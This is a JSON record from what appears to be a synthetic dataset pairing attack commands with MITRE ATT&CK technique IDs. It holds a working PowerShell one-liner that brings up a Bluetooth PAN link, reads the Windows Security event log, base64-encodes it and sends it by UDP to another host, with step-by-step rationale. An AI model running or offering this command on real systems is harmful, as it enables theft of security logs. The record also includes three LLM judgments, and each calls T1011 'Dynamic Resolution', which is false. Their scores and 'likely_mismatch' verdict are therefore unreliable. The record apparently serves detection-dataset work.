{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()",
  "explanation": "Creates a Bluetooth PAN path and exfiltrates base64-encoded event log data via UDP to a nonstandard port over the Bluetooth interface (T1011).",
  "rationale_steps": [
    "Connect to Bluetooth NAP to establish the alternate medium.",
    "Configure the Bluetooth IP using netsh, avoiding common interfaces.",
    "Bind a UDP socket to the Bluetooth IP to ensure the medium is Bluetooth.",
    "Send base64 data to a high-numbered, uncommon UDP port."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-577a0b06",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignments, pipeline operations, and object creation.",
        "semantic_score": 2,
        "semantic_justification": "While the command does exfiltrate data over Bluetooth, it doesn't implement the T1011 technique of Dynamic Resolution as it uses static IP addresses (172.25.83.5/6) rather than algorithmically determining endpoints.",
        "combined_score": 3.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T06:17:39.258323Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes/parentheses, correct command separators, valid PowerShell cmdlets and .NET method calls, and proper external command execution syntax.",
        "semantic_score": 1,
        "semantic_justification": "The command fails semantically because it requires Administrator privileges for `netsh interface ip set address` and reading `Security.evtx`, contradicting the stated 'Privilege: None', and fundamentally does not demonstrate MITRE ATT&CK T1011 (Dynamic Resolution) as it uses hardcoded IPs and static configuration rather than algorithmic determination or dynamic endpoint changes.",
        "combined_score": 3.0,
        "confidence": 1,
        "timestamp": "2025-10-02T06:17:51.695689Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quotes/parentheses, proper separators, and valid cmdlet/.NET usage.",
        "semantic_score": 2,
        "semantic_justification": "It exfiltrates data over a Bluetooth PAN via UDP but performs no dynamic endpoint resolution (static IP/port, no DNS/DGA) and likely requires admin for netsh, so it does not implement the described Dynamic Resolution technique.",
        "combined_score": 3.5,
        "confidence": 0.7,
        "timestamp": "2025-10-02T06:18:36.159507Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 1.667,
    "llm_average_score": 3.333,
    "llm_verdict": "likely_mismatch",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}